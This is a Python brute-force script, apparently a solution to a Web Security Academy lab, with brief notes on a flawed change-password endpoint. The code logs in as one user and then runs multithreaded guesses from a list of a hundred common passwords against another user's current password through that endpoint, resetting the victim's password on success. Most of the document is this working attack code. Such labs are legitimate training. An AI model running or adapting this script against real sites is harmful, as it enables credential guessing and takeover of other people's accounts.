'''
When POST /login, has one session. When POST /my-account/change-password, it adds 
another session and changes the session for /login has been changed.
Both session remains when change password again.

When type the credentials (username, current password, new password, confirmed password)
wrong, it redirects to /login and the session for /my-account/change-password is removed.

The POST /my-account/change-password endpoit is suspicious.
- If currently logged in as wiener, but change the username to carlos,
  then it redirects to /login.

A possible 
'''

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

login_url = "https://0ac100dd03798aad80c5177f00f00074.web-security-academy.net:443/login"
changepw_url = "https://0ac100dd03798aad80c5177f00f00074.web-security-academy.net:443/my-account/change-password"
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://0ac100dd03798aad80c5177f00f000	74.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0ac100dd03798aad80c5177f00f00074.web-security-academy.net/my-account?id=wiener", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
cur_account_pw = "uia"
new_pw = "uia"
login_data = {"username": "wiener", "password": cur_account_pw}
changepw_data = {"username": "", "current-password": "", "new-password-1": "", "new-password-2": ""}

passwd_list = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
]

found_password = None
lock = threading.Lock()

def try_password(passwd):
    global found_password
    
    # Check if password already found
    with lock:
        if found_password:
            return None
    
    # Create a new session for each thread
    session = requests.Session()
    
    try:
        # Login first
        login_response = session.post(login_url, headers=burp0_headers, data=login_data)
        if "Your username is" not in login_response.text:
            print(f"[-] Login failed for attempt with password: {passwd}")
            return None
        
        print(f"[*] Trying password: {passwd}")
        
        # Try to change password
        changepw_data_copy = {
            "username": "carlos",
            "current-password": passwd,
            "new-password-1": new_pw,
            "new-password-2": new_pw
        }
        
        changepw_response = session.post(changepw_url, headers=burp0_headers, 
                                        cookies=session.cookies, data=changepw_data_copy)
        
        if "success" in changepw_response.text.lower():
            with lock:
                if not found_password:
                    found_password = passwd
                    print(f"[+] SUCCESS! Password for carlos changed to {new_pw}")
                    print(f"[+] Original password was: {passwd}")
            return passwd
            
    except Exception as e:
        print(f"[-] Error trying password {passwd}: {e}")
    
    return None

def brute_force(max_threads=10):
    print(f"[*] Starting brute force with {max_threads} threads...")
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # Submit all password attempts
        futures = {executor.submit(try_password, passwd): passwd for passwd in passwd_list}
        
        # Process results as they complete
        for future in as_completed(futures):
            result = future.result()
            if result:
                # Cancel remaining futures
                for f in futures:
                    f.cancel()
                break
    
    if found_password:
        print(f"\n[+] Brute force complete! Password found: {found_password}")
    else:
        print("\n[-] Brute force complete. No password found.")
            
brute_force()